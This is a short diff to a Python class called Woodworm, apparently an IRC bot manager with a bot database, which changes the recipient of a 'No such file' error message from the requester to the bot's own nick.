@@ -124,7 +124,7 @@ class Woodworm:
         file_path = os.path.join(self.storageDirectory, filename)
 
         if not os.path.exists(file_path):
-            await irc_connection.send_query(receiver, f"No such file: {filename}")
+            await irc_connection.send_query(self.ircNick, f"No such file: {filename}")
             return
 
         bot = self.botnetDB.get_bot(receiver)
